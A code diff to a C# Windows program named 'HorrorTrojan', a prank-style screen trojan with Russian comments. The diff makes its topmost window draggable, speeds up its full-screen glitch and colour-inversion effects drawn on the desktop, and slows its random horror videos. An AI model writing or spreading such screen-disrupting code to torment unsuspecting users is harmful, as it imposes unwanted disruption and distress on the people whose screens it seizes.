@@ -33,7 +33,7 @@ namespace HorrorTrojan
         [StructLayout(LayoutKind.Sequential)]
         public struct RECT { public int Left, Top, Right, Bottom; }
         private const int NORMAL = 0x00CC0020;
-        private const int INVERT = 0x00040000; // Инверсия цветов
+        private const int INVERT = 0x00040000;
 
         private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
@@ -56,6 +56,11 @@ namespace HorrorTrojan
             InitializeComponent();
             this.Load += MainInterface_Load;
 
+            // ПОДПИСКА НА СОБЫТИЯ ПЕРЕМЕЩЕНИЯ
+            this.MouseDown += MainInterface_MouseDown;
+            this.MouseMove += MainInterface_MouseMove;
+            this.MouseUp += MainInterface_MouseUp;
+
             this.WindowState = FormWindowState.Normal;
             this.Visible = true;
             this.Show();
@@ -68,9 +73,9 @@ namespace HorrorTrojan
             get
             {
                 CreateParams cp = base.CreateParams;
-                cp.ExStyle |= 0x00000008; // WS_EX_TOPMOST
-                cp.ExStyle |= 0x02000000; // WS_EX_COMPOSITED
-                cp.ExStyle |= 0x00000020; // WS_EX_TOOLWINDOW
+                cp.ExStyle |= 0x00000008;
+                cp.ExStyle |= 0x02000000;
+                cp.ExStyle |= 0x00000020;
                 return cp;
             }
         }
@@ -172,13 +177,13 @@ namespace HorrorTrojan
             mainTimer.Tick += MainTimer_Tick;
             mainTimer.Start();
 
-            // GDI ЭФФЕКТЫ КАЖДЫЕ 5-15 СЕКУНД
-            glitchTimer.Interval = rnd.Next(5000, 15000);
+            // GDI ЭФФЕКТЫ КАЖДЫЕ 3-8 СЕКУНД
+            glitchTimer.Interval = rnd.Next(3000, 8000);
             glitchTimer.Tick += GlitchTimer_Tick;
             glitchTimer.Start();
 
-            // ВИДЕО КАЖДЫЕ 15-30 СЕКУНД
-            videoTimer.Interval = rnd.Next(15000, 30000);
+            // ВИДЕО КАЖДЫЕ 30-60 СЕКУНД (РЕЖЕ)
+            videoTimer.Interval = rnd.Next(30000, 60000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
         }
@@ -206,17 +211,12 @@ namespace HorrorTrojan
             if (!isVideoActive && !isGlitchActive)
             {
                 isGlitchActive = true;
-                glitchTimer.Interval = rnd.Next(5000, 15000);
+                glitchTimer.Interval = rnd.Next(3000, 8000);
                 
-                // СЛУЧАЙНО ВЫБИРАЕМ ЭФФЕКТ: ОБЫЧНЫЙ ИЛИ ИНВЕРСИЯ
                 if (rnd.Next(0, 3) == 0)
-                {
-                    StartInvertEffect(); // Инверсия цветов
-                }
+                    StartInvertEffect();
                 else
-                {
-                    StartGlitchEffect(); // Обычный GDI
-                }
+                    StartGlitchEffect();
             }
         }
 
@@ -225,7 +225,7 @@ namespace HorrorTrojan
             if (!isGlitchActive && !isVideoActive)
             {
                 isVideoActive = true;
-                videoTimer.Interval = rnd.Next(15000, 30000);
+                videoTimer.Interval = rnd.Next(30000, 60000);
                 ShowRandomVideo();
             }
         }
@@ -239,7 +239,8 @@ namespace HorrorTrojan
                 {
                     try
                     {
-                        for (int i = 0; i < 150; i++)
+                        // 50 итераций = 5 секунд (оптимально)
+                        for (int i = 0; i < 50; i++)
                         {
                             IntPtr hwnd = GetDesktopWindow();
                             IntPtr hdc = GetWindowDC(hwnd);
@@ -277,7 +278,6 @@ namespace HorrorTrojan
                 {
                     try
                     {
-                        // ИНВЕРСИЯ ЦВЕТОВ НА ВСЁМ ЭКРАНЕ
                         IntPtr hwnd = GetDesktopWindow();
                         IntPtr hdc = GetWindowDC(hwnd);
                         GetWindowRect(hwnd, out RECT rect);
